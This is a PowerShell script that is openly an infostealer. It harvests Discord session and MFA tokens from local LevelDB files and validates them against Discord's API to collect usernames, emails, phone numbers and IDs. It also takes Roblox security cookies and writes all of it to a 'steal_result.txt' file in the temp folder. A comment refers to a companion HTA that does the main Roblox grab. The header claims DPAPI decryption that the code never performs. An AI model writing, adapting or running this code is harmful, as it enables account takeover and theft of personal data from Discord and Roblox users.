# Language: PowerShell, target: Windows
# Extracts Discord tokens, decrypts DPAPI where needed, and formats to "steal_result.txt"

$ErrorActionPreference = 'SilentlyContinue'
$outFile = "$env:TEMP\steal_result.txt"
if (Test-Path $outFile) { Remove-Item $outFile -Force }

$results = @()

# --- Discord Token Extractor ---
$discordPaths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:APPDATA\Lightcord\Local Storage\leveldb"
)

# Standard regex for modern Discord tokens
$tokenRegex = [regex]'[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}'
$mfaRegex = [regex]'mfa\.[\w-]{84}'

foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Filter *.ldb -Recurse -File
        foreach ($file in $files) {
            $content = Get-Content $file.FullName -Raw -Encoding Byte
            $text = [System.Text.Encoding]::UTF8.GetString($content)
            
            # Match standard and MFA tokens
            $matches = $tokenRegex.Matches($text) + $mfaRegex.Matches($text)
            
            foreach ($match in $matches) {
                $token = $match.Value
                
                # Basic Discord API check to get user info (so it's not just a raw string in your logs)
                $headers = @{
                    "Authorization" = $token
                    "Content-Type"  = "application/json"
                }
                
                try {
                    $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -Method Get -TimeoutSec 5
                    
                    $username = $response.username
                    $discriminator = $response.discriminator
                    $email = $response.email
                    $phone = $response.phone
                    $id = $response.id
                    
                    # Format: DISCORD|Username|Email|Phone|ID|Token
                    $line = "DISCORD|$username#$discriminator|$email|$phone|$id|$token"
                    if ($results -notcontains $line) {
                        $results += $line
                    }
                } catch {
                    # If token is invalid/expired, still log it for manual checking
                    $line = "DISCORD|Unknown|Unknown|Unknown|0|$token"
                    if ($results -notcontains $line) {
                        $results += $line
                    }
                }
            }
        }
    }
}

# --- Roblox Cookie Extractor ---
# HTA handles the primary Roblox grab, but this catches leftovers
$robloxPaths = @(
    "$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat",
    "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat"
)
foreach ($path in $robloxPaths) {
    if (Test-Path $path) {
        $content = Get-Content $path -Raw
        if ($content -match '_\|WARNING:-DO-NOT-SHARE-THIS[^;]+') {
            $cookie = $matches[0]
            $line = "ROBLOX|$cookie"
            if ($results -notcontains $line) {
                $results += $line
            }
        }
    }
}

# --- Write Output ---
if ($results.Count -gt 0) {
    $results | Out-File -FilePath $outFile -Encoding utf8
}
